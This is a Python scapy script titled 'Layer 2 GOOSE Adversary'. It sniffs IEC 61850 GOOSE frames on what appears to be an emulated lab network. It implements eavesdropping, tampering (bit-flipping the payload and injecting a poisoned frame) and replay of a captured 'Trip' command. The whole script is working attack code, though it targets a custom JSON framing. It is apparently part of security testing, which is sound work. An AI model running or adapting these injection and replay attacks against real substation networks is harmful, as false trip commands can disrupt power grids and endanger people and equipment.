#!/usr/bin/env python3
import json
import time
import argparse
from scapy.all import sniff, Ether, Raw, sendp

parser = argparse.ArgumentParser(description="Layer 2 GOOSE Adversary")
parser.add_argument("--attack", type=str, choices=['eavesdrop', 'tamper', 'replay'], default='eavesdrop')
args = parser.parse_args()

GOOSE_TYPE = 0x88B8
IFACE = "h3-eth0"
TARGET_MAC = "01:0C:CD:01:00:01" 
captured_packets = []

def attack_logic(packet):
    if not packet.haslayer(Raw):
        return
        
    raw_payload = packet[Raw].load.decode('utf-8', errors='ignore')
    
    try:
        payload = json.loads(raw_payload)
        
        # 0. Don't attack our own injected packets!
        if payload.get("attacker_injected"):
            return
            
        print(f"\n[!!!] INTERCEPTED GOOSE FRAME [!!!]")
        
        # 1. EAVESDROP
        if args.attack == 'eavesdrop':
            print("[>] EAVESDROP: Checking payload security...")
            if payload.get("algo") != "None (Plaintext)":
                print("    [?] Status: SECURE. Payload is encrypted/signed. Cannot read APDU.")
            else:
                print("    [!] Status: VULNERABLE. Plaintext detected. I can read the GOOSE data!")

        # 2. TAMPER
        elif args.attack == 'tamper':
            print("[>] TAMPERING: Flipping bits in ciphertext/data...")
            original_data = payload.get("data", "")
            
            if len(original_data) > 4:
                # Maliciously alter the end of the hex string
                tampered_data = original_data[:-4] + "dead"
                payload["data"] = tampered_data
                payload["attacker_injected"] = True # Mark as our own
                
                poisoned_frame = Ether(dst=TARGET_MAC, type=GOOSE_TYPE) / Raw(load=json.dumps(payload).encode('utf-8'))
                
                # Wait 5ms so the original valid packet arrives at the subscriber first
                time.sleep(0.005) 
                sendp(poisoned_frame, iface=IFACE, verbose=False)
                print("    [+] Poisoned frame injected onto the wire!")

        # 3. REPLAY
        elif args.attack == 'replay':
            captured_packets.append(packet)
            print(f"[>] REPLAY: Packet captured. Stored: {len(captured_packets)}")
            
            # Wait until we see message 6 (which is usually a 'Trip' command in your setup)
            if len(captured_packets) == 6:
                print("    [+] Injecting Replay Attack! Blasting the Trip command again...")
                replay_frame = captured_packets[-1].copy()
                time.sleep(0.05) # Wait slightly so it arrives out of order
                sendp(replay_frame, iface=IFACE, verbose=False)

    except json.JSONDecodeError:
        pass

def start_hacker():
    print(f"[*] HACKER TERMINAL ONLINE | Interface: {IFACE}")
    print(f"[*] Attack Mode: {args.attack.upper()}")
    print(f"[*] Sniffing for GOOSE frames...")
    sniff(iface=IFACE, filter="ether proto 0x88b8", prn=attack_logic, store=0)

if __name__ == "__main__":
    start_hacker()
